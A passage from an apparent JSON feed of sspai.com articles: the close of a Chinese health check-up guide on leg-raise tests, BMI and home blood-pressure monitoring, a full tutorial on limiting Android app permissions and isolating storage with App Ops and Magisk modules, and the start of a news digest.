2-8mm，但腰椎间盘突出时被压迫的神经根由于受压迫/刺激产生缺血性水肿，受刺激的神经根在被牵拉时可出现根性的疼痛，所以，<strong>直腿抬高试验阳性表示椎管内神经根受到压迫或者刺激，最常见的原因就是椎间盘突出压迫神经根。</strong></p>\n<p><strong>具体操作：</strong>平躺下，双腿自然伸直，你的小伙伴一手握住踝部，另一手置于大腿前部，使膝关节保持伸直，抬高至一定的角度，若在髋关节未达到正常的最大屈曲角度（80°-90°）的时候你就已经有<strong>腰部及下肢疼痛</strong>、<strong>或者抬高后有阻力时就是阳性</strong>，注意，典型的阳性需要有大腿后侧、小腿外侧伴足背直达脚趾或踝部、跟部的疼痛，只有腰痛不算阳性，如果在抬高 30°以前就出现疼痛，说明腰椎间盘突出处在急性期，神经根周围有严重水肿，记录此时腿与床面的角度、疼痛的性质和起始部位。<strong>有阳性的就不要想着「休息几天就能好」了，赶紧去看骨科！</strong></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/20/ea10a2ac5b154b628b6002cdb9967114.gif\"><figcaption>⬆️ 动图截取自：YouTube: <a href=\"https://www.youtube.com/watch?v=Hkqr3mg6IWQ\" target=\"_blank\">Hip Joint Examination - OSCE Guide from Geeky Medics</a></figcaption></figure><h2><strong>家用工具</strong></h2>\n<h3>体重计、卷尺和体脂测量尺</h3>\n<p>一台体重秤、一把卷尺就可以给你提供健康数据，必选项目是身高、体重、腰围和臀围，可选的则包括胸围、颈围、上臂围、下臂围、大腿围、小腿围和皮褶厚度。</p>\n<p>根据身高和体重，我们可以计算体质指数（BMI），BMI=体重/身高²（单位：体重 kg，身高 m）。BMI≥24 kg/m² 且＜28 kg/m² 为超重，BMI≥28 kg/m² 则为肥胖。</p>\n<p>与超重和肥胖有关的疾病很多，这里有<strong> 3 个概念：</strong>相关疾病前期、相关疾病以及相关疾病重度并发症，我简单列一下（以提醒大家为了健康要注意体重管理），大家结合体检指南前两篇巩固一下。</p>\n<p><strong>超重或肥胖相关疾病前期</strong>：血压正常高值、血脂边缘升高、糖尿病前期、高尿酸血症等。</p>\n<p><strong>超重或肥胖相关疾病</strong>：２型糖尿病、血脂异常、高血压、 冠状动脉粥样硬化性心脏病、非酒精性脂肪性肝病、多囊卵巢综合征、女性不孕、睡眠呼吸暂停综合征、骨关节炎、痛风等。</p>\n<p><strong>超重或肥胖相关疾病重度并发症</strong>：心肌梗死、心力衰竭、脑卒中、糖尿病慢性并发症（视网膜病变，肾功能不全：肾小球滤过率 ＜60ml/1.73 m² ）、肝硬化、肥胖相关性癌症等。</p>\n<p>超重和肥胖也是有分期的，一般分为 4 期，下面贴一下《超重及肥胖人群体重管理专家共识》里的体重管理治疗建议。</p>\n<p>希望大家知道，管理体重有时并不是单纯依靠「自律」或者「意志力」就能完成的事，有的超重和肥胖是疾病的继发表现之一，因此也不必太过苛责自己，如果自己努力之后发现效果不佳、或是不确定自己制定的体重管理方案是否科学合理的话，建议去<strong>大型公立医院的营养科或内分泌科门诊</strong> 寻求专业指导。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/20/4f8feddfea7b2184876bc7cb0f4e375b.png\"></figure><p>中心性肥胖则以腰围为判定依据，可参见下表。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/20/63d14932cfd7d97c8ba1349247d60152.png\"></figure><h2>血压计</h2>\n<p>关于高血压的内容更多请参考这篇 <a href=\"https://sspai.com/post/65177\" target=\"_blank\">年轻人如何远离高血压</a>。</p>\n<p>「中国高血压健康管理规范」建议，家庭自测连续监测 5-7 天，平均血压 ≥135/85 mmHg，可诊断为高血压。<strong>具体操作上可注意：</strong></p>\n<ul>\n<li>推荐上臂式电子血压计，电子的就可以。</li>\n<li>时间上建议早晨起床后 1 小时内，或晚上睡前。早晨测量的话，要在吃早饭和降压药物前、排尿后，测量静息下的坐位血压。</li>\n<li>测量血压时，至少测量 2 次，间隔 1-2 分钟，若差别 ≤5 mmHg，则取 2 次测量的平均值；若差别 &gt;5 mmHg，应再次测量，取后 2 次测量的平均值。初诊高血压或以前发现血压高正在调整降压药物期间，建议连续自测家庭血压 7 天。如平时血压控制平稳，建议每周自测血压 1-2 天，也没有必要天天测，徒增焦虑。</li>\n</ul>\n<p>上面的那篇文章侧重于<s>吓唬大家（不是）</s>讲高血压的危害，关于诊断和治疗聊得不多，这次就再拓展一点，再讲一下高血压的分级和危险分层。</p>\n<p>依据《2020 国际高血压学会全球高血压实践指南》，对于成年人来说，高血压定义为非同日多次重复测量后，诊室收缩压 ≥140mmHg 和/或诊室舒张压 ≥90mmHg。仅 1 次就诊时测出血压高一般医生不会轻易下高血压的诊断，确诊需要测量 2-3 次诊室血压，通常间隔 1-4 周，结果均 ≥140/90mmHg 提示高血压，最好是如上述引文中描述地那样进行一段时间的稳定诊室外监测。</p>\n<p>但指南将<strong>正常血压界限调整为 130/85mmHg，收缩压 130-139mmHg 和/或舒张压 85-89mmHg 之间则为正常高值血压，</strong> 因此达不到高血压的标准但血压超过 130/85mmHg<strong> </strong>的小伙伴就要注意调整自己的生活方式了。</p>\n<p>结合相关危险因素可以对高血压患者的心血管病风险进行分类，危险因素包括：</p>\n<ol>\n<li>\n<strong>高血压介导的靶器官损害</strong> ：包括左心室肥厚（HMOD）、中重度慢性肾脏病（CKD）及其他检查方法发现的器官损害。<strong>有任何一项，不管血压多少都是高危。</strong>\n</li>\n<li>合并高血压之外的临床疾病：包括既往确诊的冠心病、心力衰竭、脑卒中、外周血 疾病、心房颤动、CKD 3 期及以上。</li>\n<li>其他危险因素：我再贴出来，强调一下，<strong>有 3 个及以上的危险因素的高血压患者也是心血管病高风险者。</strong><ul>\n<li>年龄＞65 岁</li>\n<li>性别：男性＞女性</li>\n<li>心率＞80次/min</li>\n<li>体重增加</li>\n<li>糖尿病</li>\n<li>高低密度脂蛋白胆固醇（LDL-C）/甘油三酯</li>\n<li>心血管疾病家族史</li>\n<li>高血压家族史</li>\n<li>早发性更年期</li>\n<li>吸烟</li>\n<li>社会心理因素或社会经济因素</li>\n</ul>\n</li>\n</ol>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/20/f0b33a0352ede128baa671065bd009f0.png\"></figure><p>指南依据推荐，对于所有高血压患者，生活方式干预均作为一线推荐，包括膳食调整（如减少盐、 饱和脂肪酸、反式脂肪酸等摄入，食用健康食品，适当饮用健康饮品）、戒烟限酒、规律运动、减轻压力、控制体重、减少在低温和空气污染环境中的暴露等。对于缺少循证医学证据的保健品或其他治疗方法需慎用。</p>\n<h2>写在最后</h2>\n<p>以上就是体检指南系列目前的全部内容啦，希望能给读者提供简单又充分的健康知识，如果能有所帮助就再好不过了。</p>\n<p>感谢读到这里的你，因为有你的每一次点击和充电才有了我更新的意义，也希望关注健康的你和家人都能收获健康。</p>\n<p>非常感谢责编北鸮给予的充分信任和「不催稿之恩」。🤗</p>\n<h4>参考资料</h4>\n<ul>\n<li>实用内科学，第 14 版</li>\n<li>临床诊断学，八年制第 3 版</li>\n<li>黑色素瘤诊疗规范（2018年版）</li>\n<li>家族性高胆固醇血症筛查与诊治中国专家共识，中华心血管病杂志 2018 年 2 月第 46 卷第 2 期</li>\n<li>超重或肥胖人群体重管理专家共识及团体标准，中华健康管理学杂志，2018</li>\n<li>中国慢性静脉疾病诊断与治疗指南，中华医学杂志 2019 年 10 月 22 日第 99 卷第 39 期</li>\n<li>实用静脉曲张治疗学，梅家才等主编，南京：东南大学出版社，2017.11</li>\n<li>CEAP classiﬁcation system and reporting standard, revision 2020</li>\n<li>妇产科学，八年制第 3 版</li>\n<li>2020 International Society of Hypertension global hypertension practice guidelines[J]. J Hypertens, 2020.</li>\n<li>《2020国际高血压学会全球高血压实践指南》解读，中国医学前沿杂志（电子版）2020 年第 12 卷第 5 期</li>\n<li>中国心血管健康与疾病报告 2019</li>\n<li>强直性脊柱炎的诊断与治疗骨科专家共识，中华骨科杂志 2012 年 9 月第 32 卷第 9 期</li>\n<li>强直性脊柱炎/脊柱关节炎患者实践指南，中华内科杂志 2020 年7月第 59 卷第7期</li>\n<li>腰椎间盘突出症诊疗指南，中华骨科杂志，2020 年 4 月第 40 卷第 8 期</li>\n<li>Ratish, S., Gao, Z.-X., Prasad, H.M., Pei, Z. and Bijendra, D. (2018) Percutaneous Endoscopic Lumbar Spine Surgery for Lumbar Disc Herniation and Lumbar Spine Stenosis: Emphasizing on Clinical Outcomes of Transforaminal Technique. Surgical Science, 9, 63-84.</li>\n<li>直腿抬高试验的临床诊断价值，中医学报，2020 年 12 月第 35 卷 NO.Z2</li>\n</ul>\n<p><strong>关联阅读</strong></p>\n<ul>\n<li><a href=\"https://sspai.com/post/66539\" target=\"_blank\">年轻人的体检指南 01：体检在检查什么</a></li>\n<li><a href=\"https://sspai.com/post/66635\" target=\"_blank\">年轻人的体检指南 02：个性化筛查</a></li>\n<li><a href=\"https://sspai.com/post/67474\" target=\"_blank\">医院做的这些「拍片」检查，你可以多了解一点</a></li>\n<li><a href=\"https://sspai.com/post/64889\" target=\"_blank\">让认知成为改变的第一步：年轻人如何远离高血压</a></li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a>，了解更健康的数字生活 💪</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67800"},{"title":"你的必要隐私手册 Android 篇：权限管控与存储空间隔离","date":"2021-07-21 03:29:49","description":"\n<h3><strong>Matrix 首页推荐</strong></h3>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<h2>简介</h2>\n<p>在看了《<a href=\"https://sspai.com/post/66324\" target=\"_blank\">对「自愿」上传隐私数据说不，这些是我们可以做的</a>》之后，有感于评论区里不少人对必要隐私的需求。但原文的作者并没有提到能够更多详尽的保护隐私的方法。因而，即便是想要采取一些行动，也难以入手。这让我感到颇为遗憾。因此，该文章诞生了 —— 它将致力于介绍一些在国内能够切实保护隐私的办法。</p>\n<p>这里的大部分内容主要以实操为主，尽力面向新手友好。将会有详尽的操作步骤说明。</p>\n<p>由于内容较多，这篇文章将从 Android 手机着手，着重介绍其中两个保护隐私的方式：</p>\n<ul>\n<li>拦截不正常的权限请求</li>\n<li>隔离手机存储空间</li>\n</ul>\n<p>更多内容，将在后面的文章中逐步展开。敬请期待。</p>\n<h2>开始之前...</h2>\n<p>首先，这些方法会从不同程度上依赖于一台装上 <a href=\"https://github.com/topjohnwu/Magisk\" target=\"_blank\">Magisk</a> 的手机。虽然部分可以用其它的方式（等效）替代，但总归不是最佳方案。如果可以的话，装上 <a href=\"https://github.com/topjohnwu/Magisk\" target=\"_blank\">Magisk</a> 是最好的选择😄。</p>\n<p>同时，考虑到每个人对软件的心理定价并不相近，如若相应板块主要介绍的是付费软件，文末将给出核心功能等价的免费软件（如可能），以便做出更好的选择。</p>\n<p>另外，如你选择尊重自己的隐私权，还请注意：这将<strong>一定程度上侵犯相应服务商的权益</strong>，可能会致使你的服务提供商<strong>行使拒绝提供部分或全部服务的权利</strong>。因此，还请三思而行。为便于决断，本文将在每一章的开头简略附加已知会产生这种情况的例子。当然，隐私程度的提升，也会以牺牲部分便利性作为代价。你需要自行权衡利弊，并做出认为合适的决定。</p>\n<p><strong>隐私与便利是一门平衡的艺术，世上并不存在绝对的隐私。</strong></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/20/9099b7fc1da751649ed8d19b6440fe1d.jpg\"><figcaption>相对的平衡，可以造就一副美景。过分的平衡，将破坏这种美感</figcaption></figure><p>感谢你花费许多精力读到这里。让我们正式进入这篇文章吧。</p>\n<h2>拦截权限 —— App Ops</h2>\n<blockquote>\n<p>⚠ 可能与定制系统的权限管理功能冲突。请二选一。</p>\n<p>⚠ 部分软件可能会因拒绝权限请求而停止运行。</p>\n</blockquote>\n<p>相信有很多人对于「不得不用的毒瘤软件」咬牙切齿：</p>\n<ul>\n<li>由于一些客观原因，不得不用</li>\n<li>但又会私下干点小动作...</li>\n</ul>\n<p>毒瘤软件之所以毒瘤，很大程度上就在于兼有以上两点。其表现之一，就是权限的过度索取。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/20/c4a13a7b4784336b2b681f48ae2c1d49.png\"><figcaption>被工信部通报存在过度索取权限问题的部分应用</figcaption></figure><p>那么，要如何解决这个问题呢？直接用一些手段，拦截不正常权限请求未尝不是个好主意。</p>\n<p>自 Android 4.3 开始，一个内置的核心组件被引入到系统内：<a href=\"https://developer.android.google.cn/reference/android/app/AppOpsManager\" target=\"_blank\">AppOps</a>。经过它拒绝的权限，应用会「允许使用该权限，但得到空白信息」，而不是「直接被拒绝了某项权限」。</p>\n<p>一方面，空信息可以有效的保护隐私。另一方面，不是直接拒绝，而是给予空信息的方式也在一定程度上节制了部分应用「不给权限不给用」的情况。</p>\n<p>同时，由于 AppOps 自高版本 Android 开始才在系统里内置不完整的管理前端，因此，如果想要用的舒心，则需要一个更好用的程序来接管 AppOps。理论上，你可以使用任意的前端来达到目的。我使用的是由独立开发者 Rikka 编写的应用：App Ops。</p>\n<span class=\"ss-application\" app-id=\"13234\"> </span><p>首先，这个软件的最佳实践需要你使用 Shizuku 或 Sui（它们都是同一个作者 Rikka 的作品。均免费且开源）。它们将作为 App Ops 操纵系统组件的后端。</p>\n<span class=\"ss-application\" app-id=\"15591\"> </span><p>Shizuku 与 Sui 在功能上是高度重合的。如果你的手机有 root 权限，特别是基于 Magisk的 root 权限，请优先考虑后者。</p>\n<p>退而求其次，还可以使用 ADB 激活 Shizuku 或者授予 AppOps 设备管理员权限来达到相同的目的，在 Android 11 以及更高的 Android 版本，可以无需连接电脑，通过本机无线调试即可激活 Shizuku。</p>\n<p>少数派曾经发了一篇很棒的 App Ops 使用指南：《<a href=\"https://sspai.com/post/61348\">在权限管理上跑过 iOS 14 和 Android 11：App Ops 4.0 上手指南</a>》。点击上方链接即可直达。<sup class=\"ss-footnote\" href=\"\" title=\"这里本来应该有一篇完整的使用教程。不幸的是，我写完才发现少数派已经有相同的文章了 🤣\" footnote-id=\"1\">1</sup></p>\n<h3>替代品</h3>\n<ul>\n<li>\n<a href=\"https://github.com/M66B/XPrivacyLua/\" target=\"_blank\">XPrivacyLua</a>：一款通过 Hook 系统权限管理器来实现权限管理的程序。需要 Xposed 框架，或是使用 LSPosed 等工具。</li>\n<li>\n<a href=\"https://repo.xposed.info/module/ikas.android.projectx.hook.prevent\" target=\"_blank\">AppOps Module For Invalid App</a>：一款通过 Hook 系统核心框架来实现权限管理的应用，同上。</li>\n<li>\n<a href=\"https://www.coolapk.com/apk/com.web1n.permissiondog\">权限狗</a>：一款通过 ROOT / 设备管理员等方式控制 AppOps 的前端程序。</li>\n<li>\n<a href=\"https://f-droid.org/en/packages/io.github.muntashirakon.AppManager/#:~:text=App%20Manager%20began%20by%20merging%20the%20features%20of,internet%20%28internet%20permission%20is%20required%20for%20ADB%20mode%29\" target=\"_blank\">App Manager</a>：一款通过 ROOT 来管理设备许多功能的瑞士军刀。其中包含 AppOps 权限管理功能。</li>\n</ul>\n<h2>存储空间隔离</h2>\n<blockquote>\n<p>⚠ 可能会破坏一些定制系统的功能（如 MIUI 的「主题管理」）。最坏的情况是：手机可能无法开机。建议在实操时谨慎隔离系统应用。</p>\n<p>⚠ 对某大厂游戏（「某某精英」）启用隔离会导致封号。可通过禁用存储权限的方式缓解。</p>\n</blockquote>\n<p>有些应用会在手机空间里随意安放和读取各种各样的文件。这会带来这些影响：</p>\n<ul>\n<li>手机内存变得凌乱不堪，以至于随便找个文件都是大工程；</li>\n<li>应用可能会意外上传一些重要的文件；</li>\n<li>应用可能会意外知道你喜欢的照片、音乐；</li>\n<li>应用可能会读取基于文件的唯一设备码，以实现跨应用跟踪能力；</li>\n<li>……</li>\n</ul>\n<p>简而言之：由于低版本 Android 权限设计的局限性，任何一个拿到了完整存储权限的应用，都能读取手机里几乎所有的内容。与之同时，它们可以随意写入各种文件，以达到各种预期之外的目的。这往往不是我们想要的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/20/8dd6ef67744c58ff6d9429b623226e2c.jpg\"><figcaption>Android 内置存储现状</figcaption></figure><p>需要读取的东西可以读取，不需要读取的东西不要动，也动不了。这，或许才是我们想象中的样子。</p>\n<p>不过，受制于各种因素，大多数软件开发商无暇顾及这一点。就连本将 Google，最有能力推动存储隔离的公司，也推迟了已经内置于 Android 中应用沙盒的全面推行。<sup class=\"ss-footnote\" href=\"https://source.android.google.cn/security/app-sandbox\" title=\"详情请参阅 Android Developers：https://source.android.google.cn/security/app-sandbox\" footnote-id=\"2\">2</sup></p>\n<p>那么，自己动手，就成为了丰衣足食的必要条件。让我们开始吧。</p>\n<h3>安装</h3>\n<p>你可以点击下面的应用卡片，或从合适的渠道获得应用：</p>\n<span class=\"ss-application\" app-id=\"13081\"> </span><p>打开它，并点击「启动核心服务」。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/20/45fac1ac340ae688bf5a42e72644b8b8.png\"><figcaption>描述很多很全面。主要是针对隔离的用途</figcaption></figure><p>其次，打开 Magisk。转到「仓库」页，并依次安装这两个模块（已经安装的模块无需重复）。</p>\n<ul>\n<li>Riru</li>\n<li>Riru – Enhanced mode for Storage Isolation</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/20/160ddf36d2f07e58dee80c9571563f41.png\"><figcaption>两个模块的示意图。不要纠结顺序为什么是反的（</figcaption></figure><p>安装完成之后，请重启手机。</p>\n<p>之后，打开「存储空间隔离」，开始设置隔离规则。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/20/c1671d351d3f36b628ece4aefb8b90b6.png\"><figcaption>如果一切就绪，你应该看到这样的画面</figcaption></figure><p>这里要提一句的是：由于我已经设定好了，因此会在首页看到「已处理 X 次」「已为 XX 个应用启用隔离」的字样，但存储空间隔离<strong>默认不对任何应用启用隔离</strong>。每个应用都必须要手动干预，方可实现隔离效果。同时，已经在手机里产生的文件<strong>不会自动清理</strong>，需要手动删除。</p>\n<h3>开启隔离</h3>\n<p>点击「应用管理」，你就可以看到所有申请了存储权限的应用。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/20/c4deca9448885175f37f3d916e644329.png\"><figcaption>这些都是可以隔离的应用。未申请存储权限的不在上面</figcaption></figure><p>你也许会注意到，一些应用的右侧有一个「盾形对勾图标」。它表示在云端规则（公开托管在 GitHub 中。你可以 <a href=\"https://github.com/RikkaApps/StorageRedirect-assets/issues\" target=\"_blank\">在这里</a> 查看完整的列表）里，该应用虽然申请了存储权限，但是无滥用行为（在手机存储里随意存放文件）。</p>\n<p>不过，未认证的应用未必一定会滥用存储空间。与之同时，认证的应用也有一小部分会滥用存储空间（例如未设定某个选项的 Minecraft）。是否真正隔离取决于你的个人意见。</p>\n<p>如果决定对某个应用启用隔离，请点击对应应用的图标 / 名称，进入管理界面。</p>\n<p>这里以 WPS Office 为例。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/20/6b4b6f6274ac7c77cec91e96f287d6f7.png\"><figcaption>默认是不会给应用开启隔离的。如你所见</figcaption></figure><p>如果某个应用在云端规则里被标记为「会滥用」，且隔离后不会显著影响破坏应用的行为，那么你会在这里看到「推荐为此应用使用隔离」的字样。</p>\n<p>打开隔离的方式很简单：打开「启用存储空间隔离」即可。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/20/153252a2d8e952bacca354232e7ba4bf.png\"><figcaption>隔离了~</figcaption></figure><p>如果现在就打开被隔离的应用，并试着在应用内浏览手机里的文件，你会发现：手机里原有的各种文件都看不见了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/20/93048633d55566284846b17e5ebe84f4.png\"><figcaption>原有的东西不见了！</figcaption></figure><p>这代表隔离成功。</p>\n<p>从今往后，该应用所有的写操作都会被隔离到一个单独的地方。而读操作除非主动设定，否则均无法进行。</p>\n<h3>设定读写规则</h3>\n<p>不过，基于每个应用的使用场景，我们需要对隔离的应用允许读写存储空间的某些位置（不然需要读取文件的应用就没得用了）。每个应用需要允许的内容不同，我会在文末稍微介绍一些实用的建议。</p>\n<p>对于 WPS Office，需求无非就是：</p>\n<ul><li>打开，并编辑手机里的文档。</li></ul>\n<p>那么，只需要允许 WPS Office 读取文档所在的目录就可以了。</p>\n<p>设定也很简单。还是以 WPS Office 为例。我们再次回到「存储空间隔离」，并点击「可访问的文件夹」。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/20/3ba025199885a89353195880ded513cf.png\"><figcaption>这里是设定各种访问权限的地方</figcaption></figure><p>你会在上面看到一些「模板」。</p>\n<p>这些是总结出来的最常用的允许方案。通常，应用需要的合理文件操作，上面的模板都可以实现。这里的例子也不例外。我们只需要选择「模板：下载和文档（标准文件夹）即可」。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/20/af97e09f482ae10836d67bc0a06c6f16.png\"><figcaption>勾上了「模板：下载和文档（标准文件夹）」</figcaption></figure><p>这会允许 WPS Office 读取以下两个位于手机存储空间里的文件夹：</p>\n<ul>\n<li><code>/sdcard/Download</code></li>\n<li><code>/sdcard/Documents</code></li>\n</ul>\n<p>通常，文档也只放在这两个位置，那么给予 WPS Office 这两个位置的读取权限就完全足够了。现在，再打开 WPS Office，你就会发现：程序可以拿到 <code>Documents</code> 和 <code>Download</code> 里面的文件了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/20/517f0e1c92dcd45882de1e46642aefa3.png\"><figcaption>允许访问的目录出现了！</figcaption></figure><p>同理，你也可以对其它的应用进行这样的操作，以达到隔离和便利的最佳平衡点。</p>\n<p>当然，你也许会问：如果我想要的文件路径不在模板里呢？也很简单：只需要使用「自定义（仅作用于此应用）」即可！</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/20/9851fa43fd251b70c7a2a3f0fe536676.png\"><figcaption>就是那个泛白的选项</figcaption></figure><p>点进去，你会进入一个类似于「文件管理器」的界面。在你需要允许应用访问的文件夹前面打上「对勾」，保存。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/20/8836a2b58f1bb4a1cb52307e0ce8e0e1.png\"><figcaption>打勾即代表允许该文件夹被访问。记得点击右下角的「确定」以保存</figcaption></figure><h3>设定导出规则</h3>\n<p>当然，还有另一个常用的场景。假定应用在被隔离的存储空间里放了个东西，要怎么把它取出来呢？</p>\n<p>这就需要用到「存储空间隔离」里的另一个功能了：导出被隔离的文件。设定同样简单。这里将换成「哔哩哔哩概念」来演示。</p>\n<p>点击「导出被隔离的文件」。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/20/9aa3c7f389599d55095711f236335d7f.png\"><figcaption>有点老的小蓝。但是刚好够用，不升级了</figcaption></figure><p>如果幸运的话，这里会有云端的导出规则。根据说明文字按需启用，通常就能解决大多数应用文件的导出问题。</p>\n<p>不过，如果没有已知规则的话，就需要自行设定了。</p>\n<p>转到「添加同步文件夹规则…」的选项，点击它。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/20/78fab9afd9197a05a11fcff442c131ea.png\"><figcaption>添加规则的界面</figcaption></figure><p>这里的内容有点多，我们逐一介绍一下。</p>\n<ul>\n<li>描述：用于写给人看的标记，表示这条规则是用来干啥的。可以随意选择（不会影响到实际隔离效果）。</li>\n<li>来源路径：需要取出来的，位于隔离存储空间的文件路径。</li>\n<li>目的路径：取出来的文件，放置在实际手机存储空间的位置。</li>\n</ul>\n<p>通常，我们只需要设定后两个选项即可。第一个是方便管理的标注，可以随意设定。</p>\n<p>由于每个应用放置文件的路径是不统一的，因而设置「来源路径」需要你知道应用将文件放在何处。下文假定你已经知道了相应文件的位置。</p>\n<p>点击「来源路径」，会看到一个对话框，请求选择路径：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/20/7cb77898f602e920193c236dc973b26d.png\"><figcaption>这里是隔离空间一览</figcaption></figure><p>选择的方式如下：</p>\n<ol>\n<li>点击列出的文件夹，直至对应应用存放相应文件的隔离路径。</li>\n<li>确认无误后，点击「确定」。</li>\n</ol>\n<p>听着很迷惑？为了方便理解，我们来假定这么一个隔离场景：</p>\n<ul>\n<li>「哔哩哔哩概念」原来将某个文件丢到 <code>/sdcard/Documents</code> 中</li>\n<li>为了方便管理，我希望将其内容放在 <code>/sdcard/Documents/bilibili</code> 中</li>\n</ul>\n<p>基于这个场景，我们可以这么设定「来源路径」：</p>\n<ul>\n<li>点击对话框里的 <code>Documents</code>（<code>/sdcard</code> 已经被默认加上）</li>\n<li>点击对话框右下方的「确定」</li>\n</ul>\n<p>完整的操作录屏如下：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/20/2fb63578d5717caa2ae7bdb416671d7b.gif\"><figcaption>点击、再点击...</figcaption></figure><p>这样，我们就设定好了「来源路径」。接下来，是考虑这些文件放到哪里的问题，也就是程序里的「目的路径」。</p>\n<p>还是上面那个场景，我们将这样设定「目的路径」：</p>\n<ul>\n<li>依次点击对话框里的「Documents」、「创建文件夹」、输入「bilibili」、点击「确定」</li>\n<li>点击对话框右下方的「确定」</li>\n</ul>\n<p>文字太抽象，不好理解？这里是完整的操作录像：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/20/eabf13e66a58756fb4e131619c15d0be.gif\"><figcaption>略复杂... 不知道好不好理解</figcaption></figure><p>这样，设定就完成了。以后，「哔哩哔哩概念」在 <code>/sdcard/Documents</code> 下存放的文件，都会被「镜像」到 <code>/sdcard/Documents/bilibili</code> 中。<sup class=\"ss-footnote\" href=\"https://sr.rikka.app/zh-hans/guide/advanced/technical_details_export_isolated_files/\" title=\"虽然看上去你的文件被「复制」了，但其实不是。同一份文件在手机上依然只占用一份的存储空间。你可以到这里：https://sr.rikka.app/zh-hans/guide/advanced/technical_details_export_isolated_files/\n查看相应的技术细节\" footnote-id=\"3\">3</sup></p>\n<p>同理，也可以对其它应用进行设定。如果设定得当，那么就可以实现：</p>\n<ul>\n<li>应用只会在自己的位置放置文件。除非你要求将其拿出来，放在别的位置。</li>\n<li>应用只能读取到自己的文件，以及提前设定为可以读取的文件。</li>\n</ul>\n<p>既限定了合理的边界，又不会过分影响到手机的日常使用。<sup class=\"ss-footnote\" href=\"https://sr.rikka.app/zh-hans/guide/\" title=\"原作者还在这里：https://sr.rikka.app/zh-hans/guide/\n提供了更多技术信息。如果感兴趣的话，不妨一读\" footnote-id=\"4\">4</sup></p>\n<h3>如何确定导出规则</h3>\n<p>那么，该如何确定应用的导出规则呢？以下是一些建议：</p>\n<ul>\n<li>以需求作为出发点。需要什么文件，就导出什么；</li>\n<li>根据应用分类存放文件。例如：你也许希望微信和 QQ 下载下来的文件不要都混在 <code>/sdcard/Download</code> 中。取而代之，将其放在两个子文件夹内；</li>\n<li>若不进行导出，将会损坏某个应用的功能，且没有其它方法可以解决这个问题时。那就没办法了。给个例外吧……</li>\n</ul>\n<h3>替代品</h3>\n<p>当然，如果你希望以更加经济的方式体验到隔离存储空间的好处，你可以选择：</p>\n<ul><li>\n<a href=\"https://github.com/xddxdd/lantian-nolitter\">LT-No Litter</a>：一个通过 Hook 系统框架来重定向应用读写请求的 Xposed 模块。</li></ul>\n<h2>结语</h2>\n<p>以上就是两个保护隐私的方案介绍的全部内容了。</p>\n<p>如你所见。隐私保护并没有想象中的那么困难。只是，它需要你的一点动手能力和时间。即将到来的联网控制、应用列表读取控制等内容，也将和这里的内容一样易于操作。</p>\n<p>由于我是第一次在少数派上面写文章，可能会存在各种疏漏和不完善之处，欢迎批评指正 😊。</p>\n<p>衷心希望这篇文章对你有帮助。也衷心感谢 <a href=\"https://unsplash.com/\">Unsplash</a> 提供的无版权精致图片，本文许多图片都来自于此。那么，下期见。</p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n","link":"https://sspai.com/post/67797"},{"title":"派早报：《宝可梦大集结》今日上线、特斯拉将全面开放超级充电站","date":"2021-07-21 01:03:25","description":"\n<h2>腾讯《宝可梦大集结》今日正式上线</h2>\n<p>7 月 21 日，由腾讯和宝可梦公联合《宝可梦大集结》即将上线 Nintendo Switch，用户可以登录 eShop 进行下载，大小约为 1.1GB，均支持简体中文。根据此前消息，该游戏的手机版将于今年 9 月正式上线。<a href=\"https://www.pokemonunite.jp/tc/\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img 